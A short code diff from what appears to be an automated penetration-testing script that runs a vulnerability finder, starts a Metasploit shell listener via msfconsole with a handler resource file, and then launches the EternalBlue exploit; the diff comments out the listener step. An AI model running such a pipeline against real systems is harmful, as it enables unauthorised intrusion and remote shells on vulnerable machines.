@@ -24,15 +24,15 @@ def main():
     run_script("/toolbox/workspace/vuln_finder.py")
 
     # Step 3: Start listener in background
-    print("\n[3] Starting shell listener...")
-    handler_rc_path = os.path.join("/toolbox/workspace/every_exploits", "handler.rc")
-    listener_command = [
-        "bash", "-c",
-        "BUNDLE_GEMFILE=/opt/tools/metasploit-framework/Gemfile "
-        "/usr/local/rvm/gems/ruby-3.1.5@metasploit-framework/wrappers/bundle exec "
-        f"/opt/tools/metasploit-framework/msfconsole -r /toolbox/workspace/every_exploits/handler.rc"
-    ]
-    subprocess.Popen(listener_command)
+    #print("\n[3] Starting shell listener...")
+    #handler_rc_path = os.path.join("/toolbox/workspace/every_exploits", "handler.rc")
+    #listener_command = [
+    #    "bash", "-c",
+     #   "BUNDLE_GEMFILE=/opt/tools/metasploit-framework/Gemfile "
+      #  "/usr/local/rvm/gems/ruby-3.1.5@metasploit-framework/wrappers/bundle exec "
+       # f"/opt/tools/metasploit-framework/msfconsole -r /toolbox/workspace/every_exploits/handler.rc"
+    #]
+    #subprocess.Popen(listener_command)
 
     # Step 4: Run EternalBlue exploit
     print("\n[4] Running EternalBlue exploit...")
